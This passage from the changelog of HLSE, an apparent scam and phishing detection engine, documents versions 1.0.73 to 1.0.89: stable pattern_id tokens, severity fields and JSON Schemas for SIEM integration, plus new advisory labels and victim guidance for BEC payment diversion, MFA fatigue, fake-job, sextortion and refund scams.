  - CI/CD exit-code contract, `scan_summary.max_severity` gating, ndjson
    streaming ingestion (Splunk HEC / Elastic / Datadog), and using
    `--list-patterns` as a SOAR routing table.
  - README JSON section now links the guide.

  - **Tests**: 3 new CLI integration tests that pin the documented OCSF/ECS
    severity mapping to live engine output, so the guide cannot drift
    (595 total, 0 failed).

## [1.0.89] — 2026-06-23

### Added
- **Perspective 89: normative JSON Schemas for all 13 verdict kinds — closes
  the schema-parity gap across the complete JSON API.**

  Socratic question: "We've built a complete JSON contract across P78–P88:
  uniform envelope (kind/hlse_version/score/action/severity), stable
  pattern_id tokens for SIEM routing, and a discoverable registry. But only
  5 kinds (url, text, file, secret, scan_summary) have normative schemas — the
  other 8 (esp, package, paste, network, email, clipboard, audit,
  pattern_registry) are unvalidated. A consumer can't validate these kinds
  against a schema. How do they know the JSON they received is the shape
  HLSE promised?"

  Pure documentation change — no code modifications. Added 8 new normative
  JSON Schemas (draft 2020-12):
  - `hlse_esp_verdict.schema.json` — UEFI bootkit indicators
  - `hlse_package_verdict.schema.json` — supply-chain typosquat checks
  - `hlse_paste_verdict.schema.json` — pastejacking detection
  - `hlse_network_verdict.schema.json` — C2/exfiltration indicators
  - `hlse_email_verdict.schema.json` — BEC and spoofing attacks
  - `hlse_clipboard_verdict.schema.json` — cryptocurrency hijacking
  - `hlse_audit_verdict.schema.json` — OS hardening assessment
  - `hlse_pattern_registry.schema.json` — the token registry (P88)

  All schemas follow the same structure as the existing 5: required fields,
  optional advisory fields (pattern/objective/verify/triage/cascade_risk at
  score ≥ 60), exoneration fields (40 ≤ score < 60), and blind_spot (score 0).
  New pattern_id tokens map consistently to their schemas' `const` definitions.

  - **Tests**: 5 new CLI integration tests validating schema coverage and
    spot-checking verdicts against their schemas (592 total, 0 failed).

## [1.0.88] — 2026-06-23

### Added
- **Perspective 88: `--list-patterns` — the discoverable registry of stable
  `pattern_id` tokens.**

  Socratic question: "P78–P87 made every pattern-bearing verdict emit a stable
  HLSE-* `pattern_id` so SIEM/SOAR pipelines can route on an append-only token
  instead of prose. But a stable token is only useful to automation if the FULL
  set is discoverable — and right now the only way to learn which tokens exist
  is to grep the C source. How does a detection engineer build a complete
  routing table without reading our implementation?"

  Pure output change — no detection logic touched. A new meta-command
  (`--list-patterns`, sibling to `--version` / `--self-test`) emits the
  authoritative registry of all 61 tokens:
  - **`--json --list-patterns`** → `{"kind":"pattern_registry","hlse_version":…,
    "count":61,"patterns":[{"id","kind","description"},…]}`.
  - **`--list-patterns`** (text) → an aligned `token [kind] description` table.

  A single in-source `g_pattern_registry` table is the append-only source of
  truth, grouped by kind (text, url, file, secret, esp, package, network,
  clipboard). A new regression test probes one input per kind and asserts every
  emitted `pattern_id` is present in the registry, so the registry cannot drift
  out of sync as future perspectives add tokens.

  - **Tests**: 4 new CLI integration tests (587 total, 0 failed).

### Fixed
- Corrected a stale doc comment on `file_pattern_id()` that named the catch-all
  return as `HLSE-FILE-GENERIC`; the function returns `HLSE-FILE-MASQUERADE`.

## [1.0.87] — 2026-06-23

### Added
- **Perspective 87: stable `pattern_id` for all remaining pattern-bearing kinds —
  closes the last `pattern` / `pattern_id` asymmetry across the full 12-kind
  JSON API.**

  Socratic question: "P86 closed the `file`/`secret` gap so that all four kinds
  emitting a prose `pattern` now carry a stable HLSE-* token. But six other kinds
  (`esp`, `package`, `network`, `clipboard`, `paste`, `email`) also emit `pattern`
  when score ≥ 60 — and none of them carry `pattern_id`. A SIEM rule written as
  `pattern_id == 'HLSE-PKG-TYPOSQUAT'` is more robust than one that
  substring-matches prose like 'dependency confusion / typosquat supply-chain
  attack'. Why does the stable-token guarantee still have six exceptions?"

  Pure output change — no detection logic touched. Each kind receives its token:
  - `esp` → `HLSE-ESP-BOOTKIT`
  - `package` → `HLSE-PKG-TYPOSQUAT`
  - `network` → `HLSE-NET-C2`
  - `clipboard` → `HLSE-CLIP-HIJACK`
  - `paste` → delegates to `hlse_text_pattern_id()` on the ClickFix TextVerdict
    proxy (e.g. `HLSE-CLICKFIX`)
  - `email` (header-only BLOCK path) → delegates to `hlse_text_pattern_id()` on
    the synthesised BEC TextVerdict (e.g. `HLSE-BEC-WIRE`)

  Co-presence invariant preserved: `pattern_id` is present if and only if
  `pattern` is present; safe verdicts carry neither.

  - **Tests**: 5 new CLI integration tests (583 total, 0 failed).

## [1.0.86] — 2026-06-23

### Added
- **Perspective 86: stable `pattern_id` for `file` and `secret` kinds —
  completes the stable-token contract across all pattern-bearing verdict
  kinds.**

  現段階の長所短所 review: the JSON API's strength is its uniform contract
  (kind, hlse_version, score, action, severity everywhere). The remaining
  weakness was a `pattern_id` asymmetry — P78/P79 gave `url` and `text` stable
  routing tokens, but `file` and `secret` (the other two kinds that emit a
  prose `pattern`) still forced a SIEM to substring-match the prose
  ("double-extension file masquerade…", "exposed credential — AWS Access
  Key ID"). A wording polish to those labels would silently break automation,
  exactly the failure P78 was created to prevent.

  Pure output change — no detection logic touched. Two static helpers map the
  existing prose pattern to an append-only token:
  - `file_pattern_id()`: `HLSE-FILE-RTL-OVERRIDE`, `HLSE-FILE-DOUBLE-EXT`,
    `HLSE-FILE-MACRO`, `HLSE-FILE-PDF-JS`, `HLSE-FILE-MASQUERADE`.
  - `secret_pattern_id()`: `HLSE-SECRET-AWS`, `HLSE-SECRET-GITHUB`,
    `HLSE-SECRET-STRIPE`, `HLSE-SECRET-SLACK`, `HLSE-SECRET-GOOGLE`,
    `HLSE-SECRET-OPENAI`, `HLSE-SECRET-ANTHROPIC`, `HLSE-SECRET-AZURE`,
    `HLSE-SECRET-PRIVATE-KEY`, `HLSE-SECRET-JWT`, `HLSE-SECRET-GENERIC`.

  - **JSON**: `pattern_id` now emitted alongside `pattern` at all four
    file/secret JSON sites (standalone + scan-path for each).
  - **Schemas**: `hlse_file_verdict` and `hlse_secret_verdict` gain `pattern_id`
    with provider-specific pattern constraints.
  - **Tests**: 4 new CLI integration tests (578 total, 0 failed).

## [1.0.85] — 2026-06-23

### Added
- **Perspective 85 (Socratic): `max_severity` in `scan_summary` — single-line
  consumers now get the same numeric routing capability as per-verdict consumers.**

  Socratic question: "The `scan_summary` carries `threats` (count) and `gate_hits`
  (threshold crossings), but no severity rating of the overall scan. A CI/CD
  pipeline consuming only the final summary line cannot write `max_severity >= 3`
  to gate on BLOCK+; it can only check `threats > 0`, which doesn't distinguish
  a scan with 1 LOG finding from one with 3 ISOLATE findings. Shouldn't
  `scan_summary` include `max_severity` so a single-line consumer has the same
  numeric gate capability as a per-verdict consumer?"

  Pure output change — no detection logic touched. `max_score` is tracked
  alongside the existing `threats` counter at all three scan-path verdict sites
  (file, secret-in-scan, URL-in-scan), then mapped to 0–4 via
  `hlse_severity_for_score()` for the summary.

  - **`scan_summary` JSON**: new `"max_severity": N` field (0 when clean).
  - **`schema/hlse_scan_summary.schema.json`**: `max_severity` added as
    required field with `minimum: 0, maximum: 4`.
  - **Tests**: 3 new CLI integration tests (574 total, 0 failed) verifying
    ISOLATE threat → max_severity 4, clean scan → 0, and schema validation.

## [1.0.84] — 2026-06-23

### Added
- **Perspective 84 (Socratic): `hlse_version` field in every JSON output path —
  verdicts are now self-documenting for audit trails and retrospective triage.**

  Socratic question: "Every verdict is stored with a score and action, but no
  record of which version of HLSE produced it. Six months from now, an analyst
  reviewing a stored SAFE verdict cannot distinguish 'definitively clean under
  v1.0.84 with ClickFix + MFA-fatigue + refund-scam detection' from 'probably
  clean under v0.9.0 with no text detection at all'. A verdict that predates a
  new detector (e.g. OAuth device-code added in P57) silently misleads
  retrospective triage. Shouldn't every JSON verdict carry `hlse_version` so
  stored verdicts are self-documenting and re-scan campaigns can identify those
  older than a given detection capability?"

  Pure output change — no detection logic touched. Uses compile-time string
  concatenation (`"..." HLSE_VERSION "..."`) for zero runtime overhead; the
  version is compiled into the binary so the field always matches the actual
  detector set.

  - **Coverage**: all 12 JSON kind paths (url, text, file ×2, secret ×2, esp,
    package, paste, network, email, clipboard, audit, scan_summary).
  - **Schemas**: all 5 JSON Schema files updated to include `"hlse_version"`
    as a required field with a semver pattern constraint (`^\d+\.\d+\.\d+$`).
  - **Tests**: 4 new CLI integration tests (571 total, 0 failed) verifying
    semver shape on url/text/file kinds and cross-kind consistency.

## [1.0.83] — 2026-06-23

### Added
- **Perspective 83 (Socratic): JSON Schema for `file`, `secret`, and
  `scan_summary` kinds — completes the scan-output stream schema coverage.**

  Socratic question: "P81 added schemas for `url` and `text` verdicts. But
  `hlse_core --json scan <dir>` emits a mixed stream of `file`, `secret`,
  and `scan_summary` lines that an integrator can't validate against the P81
  schemas. A CI/CD pipeline that pipes scan output through schema validation
  would still pass INVALID `file` and `secret` lines silently. Shouldn't the
  `schema/` directory include schemas for the most common CI/CD scan kinds?"

  Pure documentation/schema addition — no code changed.

  - **`schema/hlse_file_verdict.schema.json`**: covers `--json file` output
    and the file entries in scan output streams.
  - **`schema/hlse_secret_verdict.schema.json`**: covers `--json secret` and
    the scan-path variant (with `path` and `line` fields).
  - **`schema/hlse_scan_summary.schema.json`**: covers the final
    `scan_summary` rollup line from `--json scan`.
  - **Tests**: 1 new schema-validation test (567 total, 0 failed) validating
    real `file`, `secret`, and `scan_summary` JSON against the new schemas.

## [1.0.82] — 2026-06-23

### Added
- **Perspective 82 (Socratic): numeric `severity` field extended to ALL JSON
  output paths — closes the cross-kind routing gap P80 opened.**

  Socratic question: "P80 added `severity` to `print_json_url` and
  `print_json_text`. But `hlse_core` has 14+ subcommands — `file`, `secret`,
  `email`, `audit`, `paste`, `network`, `esp`, `package`, `clipboard` — and
  each emits its own `{"kind":"..."}` JSON from a separate code path. A SIEM
  with a single `severity >= 3` routing rule covers URL and text alerts but
  **silently misses** a high-severity file-masquerade (`.pdf.exe`) or AWS key
  detection, because those JSON paths never emitted `severity`. Shouldn't every
  `--json` path emit `severity` so one numeric gate works uniformly across all
  subcommands?"

  Pure output change — no detection logic touched. Added
  `hlse_severity_for_score()` call to all remaining JSON emitters:
  `file` (in scan + standalone), `secret` (in scan + standalone), `esp`,
  `package`, `paste`, `network`, `email`, `clipboard`, `audit`.

  - **Before**: 2 of 12 JSON kinds emitted `severity` (url, text only)
  - **After**: all 12 JSON kinds emit `severity` uniformly
  - **Tests**: 4 new CLI integration tests (566 total, 0 failed) verifying
    severity on file/secret/esp kinds and the monotonic invariant across kinds.

## [1.0.81] — 2026-06-23

### Added
- **Perspective 81: normative JSON Schema for URL and text verdict outputs —
  the first machine-readable contract document for HLSE's JSON API.**

  Socratic question: "After P78–P80, a SIEM engineer has stable `pattern_id`
  tokens and a numeric `severity` field. But to integrate HLSE output into a
  typed client or validator, they still need to read C source or infer the
  shape from examples. An undocumented schema means integrators hard-code
  field names with no way to catch when a field becomes conditional or when
  a new required field is added. Shouldn't HLSE ship a normative JSON Schema
  so integrators can validate outputs, generate typed client code (Python
  dataclasses, TypeScript interfaces, Go structs), and understand optional
  vs. required fields without reading C?"

  Pure documentation/schema addition — no code or detection logic changed.

  - **`schema/hlse_url_verdict.schema.json`**: Full JSON Schema (2020-12) for
    `--json <url>` output. Documents all 23 fields with types, constraints,
    conditionality, and `pattern_id` enum examples. `additionalProperties: false`
    so any future field addition is explicitly tracked.
  - **`schema/hlse_text_verdict.schema.json`**: Full JSON Schema for
    `--json text` output. Same structure with text-specific fields
    (`exoneration` instead of `confusable`/`ascii_diff`/`safe_url`).
  - **Tests**: 1 new schema-validation test (562 total, 0 failed) running 4
    real verdict JSON objects through `jsonschema.validate()`. Skips gracefully
    when `jsonschema` is not installed.

## [1.0.80] — 2026-06-23

### Added
- **Perspective 80: numeric `severity` field (0–4) in URL and text JSON output
  for SIEM/SOAR numeric routing — closes the last fragile string-comparison
  coupling in the JSON API.**

  Socratic question: "After P78–P79, a SIEM consumer can key on `pattern_id`
  instead of prose for pattern routing. But to gate on 'actionable threat', the
  rule still writes `action == 'BLOCK' || action == 'ISOLATE'` — two string
  comparisons coupled to our exact tier names. If we ever inserted a new tier
  (say 'QUARANTINE' between ALERT and BLOCK), every SIEM rule would silently
  miss it. Shouldn't the JSON also carry a monotonic `severity` integer (0=SAFE,
  1=LOG, 2=ALERT, 3=BLOCK, 4=ISOLATE) so rules can write `severity >= 3` as a
  stable numeric gate that covers any future tier inserted above that threshold?"

  Pure advisory/output change — no scoring or detection logic touched. The new
  `hlse_severity_for_score()` maps the 0–100 score to a 0–4 integer following
  the same band boundaries as `hlse_action_for_score()`.

  - **API**: new `int hlse_severity_for_score(int score)` in `hlse_core.h`.
  - **JSON (URL)**: `--json <url>` gains `"severity": N` immediately after
    `"action"`; channel path gains `"effective_severity": N` alongside
    `"effective_action"`.
  - **JSON (text)**: `--json text` gains `"severity": N` and
    `"effective_severity": N` on the same positions.
  - **Mapping**: 0=SAFE (0–14), 1=LOG (15–39), 2=ALERT (40–59),
    3=BLOCK (60–79), 4=ISOLATE (80+) — aligned with CVSS None/Low/Medium/High/Critical.
  - **Tests**: 5 new CLI integration tests (561 total, 0 failed) verifying
    ISOLATE→4, SAFE→0, BEC ISOLATE→4, clean text→0, and the monotonic
    integer co-mapping invariant.

## [1.0.79] — 2026-06-22

### Added
- **Perspective 79: stable machine-readable `pattern_id` for URL verdicts —
  the symmetric URL counterpart of P78. After P78 gave text verdicts a stable
  `HLSE-*` token, URL verdicts were left exposing only the prose `pattern`
  label, so a SIEM/SOAR consuming URL alerts still had to substring-match prose
  we keep refining. This closes that asymmetry: every URL verdict now carries
  an append-only `HLSE-URL-*` token (e.g. `HLSE-URL-IDN-HOMOGRAPH`,
  `HLSE-URL-SUBDOMAIN-HARVEST`, `HLSE-URL-SHORTENER`).**

  Strengths/weaknesses review (現段階の長所短所): the engine's biggest strength
  is its uniform, append-only advisory contract; P78 strengthened it for text
  but introduced an asymmetry — the URL path, which is the original and most
  heavily used surface, lacked the stable id. The weakness was discoverability:
  an automation author reading the JSON for a URL alert found `pattern` but no
  machine key, and would either hard-code prose or fall back to the score. The
  improvement is to mirror P78 exactly so both surfaces present the same
  `{pattern, pattern_id}` shape.

  Pure advisory/output change — no scoring or detection logic touched. The new
  `hlse_url_pattern_id()` is a read-only lookup over the existing
  `hlse_classify_url_attack()` classification, so F1 is unchanged. Tokens are
  **append-only**: meaning is fixed once issued, and prose refinements never
  alter the id.

  - **API**: new `const char *hlse_url_pattern_id(const Verdict *v)` in
    `hlse_core.h` — stable token, or NULL when score is 0 / no pattern.
  - **JSON**: `--json <url>` output gains a `"pattern_id"` field, emitted
    alongside `"pattern"` (present iff the prose `pattern` is present).
  - **Tokens (initial set)**: `HLSE-URL-IDN-HOMOGRAPH`, `HLSE-URL-MULTI-BRAND`,
    `HLSE-URL-HOMOGLYPH`, `HLSE-URL-AT-CRED-TRICK`, `HLSE-URL-IP-BRAND`,
    `HLSE-URL-FREEHOST`, `HLSE-URL-SUBDOMAIN-HARVEST`, `HLSE-URL-SUBDOMAIN`,
    `HLSE-URL-TYPOSQUAT-HARVEST`, `HLSE-URL-TYPOSQUAT`, `HLSE-URL-HYPHEN-HARVEST`,
    `HLSE-URL-HYPHEN-BRAND`, `HLSE-URL-CRED-HARVEST`, `HLSE-URL-BRAND-RISKY-TLD`,
    `HLSE-URL-BRAND`, `HLSE-URL-SHORTENER`, `HLSE-URL-DGA`, `HLSE-URL-GENERIC`.
  - **Tests**: 6 new CLI integration tests (556 total, 0 failed) verifying the
    id for homoglyph / IDN / shortener / subdomain-spoof URLs, well-formedness
    and co-presence, and that clean URLs carry no id.

## [1.0.78] — 2026-06-22

### Added
- **Perspective 78: stable machine-readable `pattern_id` for text verdicts —
  every text verdict's prose `pattern` label is now accompanied by an
  append-only `HLSE-*` token (e.g. `HLSE-BEC-WIRE`, `HLSE-SEXTORTION`,
  `HLSE-OAUTH-DEVICECODE`) so SIEM/SOAR automation can route on a stable
  identifier instead of substring-matching prose that we keep refining.**

  Socratic question: "Every text verdict now carries a human `pattern` label,
  but that label is prose we keep polishing — when P57 changed 'Verify first'
  to 'Verify independently' a downstream test broke. A SIEM or SOAR rule that
  wants to route 'OAuth device-code phishing' alerts has no choice but to
  substring-match the prose, so every wording polish silently risks breaking
  automation. Shouldn't each pattern also expose a STABLE id
  (e.g. `HLSE-OAUTH-DEVICECODE`) that survives wording changes, so machines key
  on the id and humans read the label?"

  Pure advisory/output change — no scoring or detection logic touched. The new
  `hlse_text_pattern_id()` maps the prose label returned by
  `hlse_classify_text_attack()` to a stable token; it is a read-only lookup
  over the existing classification, so F1 is unchanged. The contract is that
  these tokens are **append-only**: a token's meaning never changes once
  issued, and prose refinements never alter the id.

  - **API**: new `const char *hlse_text_pattern_id(const TextVerdict *v)` in
    `hlse_core.h` — returns the stable token, or NULL when score is 0 / no
    pattern was recognised.
  - **JSON**: `--json text` output gains a `"pattern_id"` field, emitted
    alongside `"pattern"` (present iff the prose `pattern` is present).
  - **Tokens (initial set)**: `HLSE-CLICKFIX`, `HLSE-OAUTH-DEVICECODE`,
    `HLSE-MFA-FATIGUE`, `HLSE-BEC-PAYMENT-DIVERSION`, `HLSE-BEC-CEO`,
    `HLSE-BEC-WIRE`, `HLSE-TECH-SUPPORT`, `HLSE-JOB-SCAM`, `HLSE-ADVANCE-FEE`,
    `HLSE-SEXTORTION`, `HLSE-RANSOM`, `HLSE-INVESTMENT`, `HLSE-EMERGENCY`,
    `HLSE-QUISHING`, `HLSE-REFUND-SCAM`, `HLSE-CALLBACK-TOAD`, `HLSE-AUTHORITY`,
    `HLSE-URGENCY-CRED`, `HLSE-FAKE-ALERT`, `HLSE-URGENCY`, `HLSE-CRED-LURE`,
    `HLSE-PRIZE`, `HLSE-GENERIC`.
  - **Tests**: 6 new CLI integration tests (550 total, 0 failed) verifying the
    id for urgency-cred / BEC / sextortion / MFA-fatigue, the well-formedness
    and co-presence invariant, and that clean verdicts carry no id.

## [1.0.77] — 2026-06-21

### Added
- **Perspective 77: refund / subscription-renewal scam (fake auto-renewal
  invoice) now has its own pattern label and advisory lenses — the Geek Squad
  / Norton / McAfee "your membership auto-renewed, call to cancel" scam was
  previously folded into the generic "callback phone scam (TOAD / vishing)"
  label, which misses the refund-specific over-refund and remote-access
  mechanics.**

  Socratic question, derived from 2026 refund-scam reports (LifeLock, NordVPN,
  Bitdefender, FTC): "A Geek Squad auto-renewal scam scores 85 (ISOLATE) and
  classifies as 'callback phone scam (TOAD / vishing)'. The TOAD advice — 'do
  not call the number; find the official number independently' — is correct as
  far as it goes, but the refund scam has a distinctive second act the generic
  advice never names: when you DO call, the agent confirms the charge, offers a
  'refund', and then either asks for remote access to 'process' it or claims
  they 'accidentally refunded too much' and pressures you to wire back the
  difference (which they never actually sent). The single clarifying fact — a
  genuine refund needs NOTHING from you, and no real company phones you to give
  money back — is exactly what the victim needs and exactly what 'find the
  official number' omits. Shouldn't the refund scam get its own label and a
  remedy keyed to the over-refund and remote-access tricks?"

  Pure advisory change — no scoring/detection logic touched. The auto-renewal
  / refund phrases already fire (within the existing signals) and already
  produce a BLOCK/ISOLATE score; this perspective only adds a classification
  branch and the advisory strings keyed to it, using the same matched-phrase
  keying as P73–P76. The branch is placed above the generic callback/TOAD
  branch so a refund scam is labeled precisely; a plain callback/vishing
  message (no refund/renewal language) is unaffected.

  - **pattern** (`hlse_classify_text_attack`): "refund / subscription-renewal
    scam (fake auto-renewal invoice)".
  - **objective**: "money and device access via a fake refund — the invoice is
    bait to make you call; the 'refund' then requires remote access … or
    tricks you into wiring back an 'over-refund' the scammer never actually
    sent".
  - **verify**: "check the charge in your real bank or card statement, or the
    provider's official app — never the number or link in this message; no
    genuine company phones you to give money back, so an unexpected 'refund'
    offer is itself the scam".
  - **triage**: "do not call the number; if you already called, never grant
    remote access or send back an 'over-refund' — a genuine refund needs
    nothing from you … dispute any real charge through your card issuer".
  - **cascade**: "if you granted remote access or moved any money, treat the
    whole device and every account you opened during the call as compromised".
  - **exoneration** (LOG/ALERT band): "real subscriptions do auto-renew.
    Decisive test: open your bank/card statement or the provider's official app
    directly … a 'call to cancel' invoice for a service you don't use is the
    tell".

  Research sources: LifeLock「3 Geek Squad scams」, NordVPN「Geek Squad email
  scam 2026」, Bitdefender Geek-Squad guide, FTC subscription-renewal /
  refund-scam advisories, Aura「Geek Squad Scams 2026」. 6 new integration
  tests; 544 pass, 0 fail; zero warnings CLI + lib.

## [1.0.76] — 2026-06-21

### Added
- **Perspective 76: sextortion / webcam blackmail now has its own pattern
  label and advisory lenses — previously this high-volume extortion subtype
  was folded into the generic "ransom / extortion message" label, whose
  ransomware-framed advisory ("paying does not guarantee recovery") is the
  wrong mental model for a threat that is usually an empty bluff.**

  Socratic question, derived from 2026 sextortion/romance-scam reports
  (LifeLock, NCOA, Security Magazine): "HLSE already detects sextortion
  language ('I activated your webcam', 'I have footage of you', 'send this
  video to your contacts') — such a message scores high (BLOCK). But it
  classifies as 'ransom / extortion message', so the objective says
  'cryptocurrency payment — paying does not guarantee RECOVERY'. That framing
  is borrowed from ransomware, where files are genuinely encrypted. In
  sextortion there is nothing to recover and, crucially, the threat is almost
  always an empty bluff: the email is mass-mailed to millions, the 'leaked
  password' was bought from a data breach (not proof of webcam access), and no
  footage exists. The victim most needs to hear two things the generic
  advisory never says: (1) this is almost certainly a bluff, and (2) do not
  REPLY — replying confirms a live target. Shouldn't sextortion get its own
  label and a remedy keyed to the bluff and the do-not-reply rule?"

  Pure advisory change — no scoring/detection logic touched. The sextortion
  phrases already fire (within the Ransom/extortion signal) and already
  produce a BLOCK score; this perspective only adds a classification branch
  and the advisory strings keyed to it, using the same matched-phrase keying
  as P73–P75. The branch is placed above the generic ransom/extortion branch
  so webcam-blackmail is labeled precisely; a true ransomware message
  (encrypted files) still classifies as "ransom / extortion message".

  - **pattern** (`hlse_classify_text_attack`): "sextortion / webcam
    blackmail".
  - **objective**: "an extortion payment for a threat that is almost always an
    empty bluff … even AI-deepfaked images do not make paying work".
  - **verify**: "the 'I hacked your webcam' claim is almost always a bluff
    blasted to millions — any password they quote was bought from a data
    breach, not proof of access … do not pay and do not reply".
  - **triage**: "do NOT pay and do NOT reply — replying confirms a live
    target … report to IC3 / your national cybercrime line (and, if a minor is
    involved, NCMEC at CyberTipline.org); if real intimate images of you do
    exist, report them to the platform for takedown".
  - **cascade**: "nothing of yours is technically compromised by the threat
    itself — but if you reused the breached password they quoted, change it …
    tighten privacy on your social accounts".
  - **exoneration** (LOG/ALERT band): "these threats feel personal but are
    almost always mass-mailed bluffs. Decisive test: can they show actual
    footage, or only claim it?".

  Research sources: LifeLock「online dating scams / sextortion red flags」,
  NCOA deepfake-scam guide, Security Magazine「Industrial-Scale Romance Scam
  Economy 2026」, Bitdefender deepfake red flags, FBI IC3 / NCMEC sextortion
  guidance. 5 new integration tests; 538 pass, 0 fail; zero warnings CLI + lib.

## [1.0.75] — 2026-06-21

### Added
- **Perspective 75: fake-job / task scam (pay-to-start employment fraud) now
  has its own pattern label and advisory lenses — 2026's fastest-growing
  consumer fraud (FTC: $521M lost, +1000% spike May–Jul 2026) was previously
  split between the generic "lottery / advance-fee fraud" and "investment scam
  / pig-butchering" labels.**

  Socratic question, derived from FTC/McAfee 2026 remote-job-scam reports:
  "HLSE already detects fake-job language ('work from home opportunity',
  'starter kit', 'buy your equipment', 'reimbursed on first paycheck',
  'mystery shopper') — an equipment-advance-fee job scam scores 67 (BLOCK).
  But it classifies as 'investment scam / pig-butchering', so the verify lens
  says 'check the firm's FCA/SEC registration' — irrelevant to a job seeker.
  And a task-scam crypto-deposit lure classifies as 'lottery / advance-fee
  fraud'. Neither names the one rule that settles every job scam: a real job
  only ever pays money TO you — no legitimate employer asks you to pay to
  start, deposit funds to 'unlock' tasks, or buy equipment upfront. Neither
  warns that the 'work-from-home security suite' the victim is told to install
  is often a remote-access trojan. Shouldn't the fastest-growing 2026 consumer
  fraud get its own label and a remedy keyed to the pay-to-start tell and the
  RAT risk?"

  Pure advisory change — no scoring/detection logic touched. The fake-job
  phrases already fire as signals (and already produce a BLOCK score); this
  perspective only adds a classification branch and the advisory strings keyed
  to it, using the same matched-phrase keying as P73/P74. The branch is placed
  above the generic lottery/advance-fee and investment/pig-butchering branches
  so a job scam is labeled precisely; a pure investment lure (no job language)
  still classifies as "investment scam / pig-butchering".

  - **pattern** (`hlse_classify_text_attack`): "fake-job / task scam
    (pay-to-start employment fraud)".
  - **objective**: "upfront fees and deposits you will never recover … any
    'work-from-home app' they tell you to install may be a remote-access
    trojan that drains your bank and files".
  - **verify**: "a real job only ever pays money TO you — no legitimate
    employer asks you to pay to start, deposit your own funds to 'unlock'
    tasks or earnings, or buy equipment upfront; that request alone proves the
    job is fake".
  - **triage**: "stop all payments and deposits now … if you installed any
    'work-from-home' or 'security' app they sent, disconnect from the internet
    and remove it — it may be a remote-access trojan; report to the FTC
    (reportfraud.ftc.gov)".
  - **cascade**: "any card or account you used to pay, and any credentials you
    entered on the fake 'employer portal' … if you ran their software, treat
    the whole device as compromised".
  - **exoneration** (LOG/ALERT band): "legitimate recruiters do reach out.
    Decisive test: does the 'job' require you to pay anything, deposit your own
    funds, or buy equipment to start? A real job pays you — money only ever
    flows TO you, never from you".

  Research sources: FTC Consumer Advice「Job Scams」, McAfee 2026 job-scam
  spike report, The Interview Guys「Remote Job Scams 2026」, Remote Work Europe
  scams guide, DailyRemote red-flags guide. 6 new integration tests; 533 pass,
  0 fail; zero warnings CLI + lib.

## [1.0.74] — 2026-06-21

### Added
- **Perspective 74: MFA-fatigue / push-bombing ("approve-the-prompt") now has
  its own pattern label and advisory lenses — previously this Scattered
  Spider / Lapsus$ TTP was mislabeled "fake security alert" and the advisory
  never told the victim the defining fact: an unsolicited MFA prompt means the
  password is ALREADY stolen.**

  Socratic question, derived from Qiita/Zenn 2026 passkey-migration and MFA
  reports: "HLSE already detects MFA push-bombing language ('approve the
  notification', 'just approve it', 'you will keep receiving requests until you
  approve') — such a message scores 70 (BLOCK). But it classifies as 'fake
  security alert / account suspension phishing', so the advisory is generic
  'navigate to the site directly and check your account'. That misses the
  single most important fact about MFA fatigue: the attacker already has the
  password (that's why the prompts are firing), and approving one — even just
  to make the spam stop — hands them an authenticated session. The right
  advice is the opposite of 'log in and check': it is 'DENY the prompt, and
  change your password because it is already compromised'. Shouldn't the
  approve-the-prompt attack get its own label and a remedy that names the
  already-compromised password and the deny-don't-approve action?"

  Pure advisory change — no scoring/detection logic touched. The push-bombing
  phrases already fire as signals (and already produce a BLOCK score); this
  perspective only adds a classification branch and the advisory strings keyed
  to it, using the same matched-phrase keying as the P73 payment-diversion and
  the existing gift-card → tech-support branches. The branch is placed below
  device-code (so a verification-code message stays "OAuth device-code
  phishing") and above the generic fake-alert/credential branches.

  - **pattern** (`hlse_classify_text_attack`): "MFA-fatigue / push-bombing
    (approve-the-prompt attack)".
  - **objective**: "account takeover via MFA approval — the attacker already
    has your password and is spamming push prompts; approving one hands them
    an authenticated session".
  - **verify**: "never approve an MFA or authenticator prompt you did not
    start yourself — a prompt or 'approve' request that arrives when you were
    not logging in means someone ALREADY has your password; deny it, and never
    approve to 'make the prompts stop'".
  - **triage**: "deny/dismiss the prompt; do NOT approve it — then change your
    password immediately from a device you trust … if you did approve one,
    sign out all sessions, rotate the password, and report it to your IT/
    security team".
  - **cascade**: "every account sharing this now-compromised password, and
    your email … switch this account to phishing-resistant MFA (a passkey or
    hardware key) that cannot be approved by mistake".
  - **exoneration** (LOG/ALERT band): "legitimate sign-ins do trigger MFA
    prompts. Decisive test: did YOU just try to log in? If an 'approve'
    request or push arrives that you did not start, deny it".

  Research sources: Zenn「現在のパスキーは単一障害点である」, Qiita「パスキー
  認証と2要素認証の仕組み」, Qiita「パスキーが万能ではない3つの理由」, CISA/
  Microsoft Scattered Spider & Lapsus$ MFA-fatigue advisories. 7 new
  integration tests; 527 pass, 0 fail; zero warnings CLI + lib.

## [1.0.73] — 2026-06-21

### Added
- **Perspective 73: payment-diversion BEC (bank-account-change / payroll
  fraud) now has its own pattern label and advisory lenses — previously this
  fastest-growing BEC variant (per the FBI) was mislabeled "urgency
  credential-harvest phishing" and told victims to change their password.**

  Socratic question, derived from Proofpoint/SpiderLabs/FBI 2026 BEC reports:
  "HLSE already detects vendor/payroll banking-change language ('our bank
  account has changed', 'please update our bank', 'new banking details') — a
  vendor banking-change message scores 73 (BLOCK). But it classifies as
  'urgency credential-harvest phishing', so the objective says 'account
  credentials — all sites sharing this password are at cascade risk' and the
  triage says 'change that account's password and enable 2FA'. That advice is
  not just unhelpful, it is WRONG: payroll/vendor-diversion fraud is not a
  credential attack — the attacker requested a BANK-ACCOUNT CHANGE to reroute
  the next payroll deposit or invoice payment to their account. No password is
  at risk; the decisive action is to verify the banking change out-of-band and
  refuse to update the payee. The FBI calls payroll diversion one of the
  fastest-growing BEC variants. Shouldn't a bank-account-change request get
  its own label and a remedy that matches the actual harm?"

  Pure advisory change — no scoring/detection logic touched. The banking-change
  phrases already fire as signals (and already produce a BLOCK score); this
  perspective only adds a classification branch and the advisory strings keyed
  to it. The new branch keys on banking-change phrases surfaced in the matched-
  phrase text of the reasons (same mechanism as the existing gift-card →
  tech-support keying), and is placed ABOVE the generic BEC-wire-transfer and
  credential-harvest branches so a bank-account-change request is labeled
  precisely. A pure CEO/wire-transfer message (no banking-change language) is
  unaffected and still classifies as "BEC / CEO-fraud wire-transfer".

  - **pattern** (`hlse_classify_text_attack`): new label "payment-diversion
    BEC (bank-account-change / payroll fraud)".
  - **objective**: "redirected payments — your next payroll deposit or vendor
    invoice is rerouted to the attacker's bank account; the money is gone once
    the payment run clears".
  - **verify**: "confirm any bank-account or direct-deposit change by calling
    the employee or vendor on a number you ALREADY have on file — never the
    number, email, or reply-to in the request; a banking-detail change is the
    single highest-risk request".
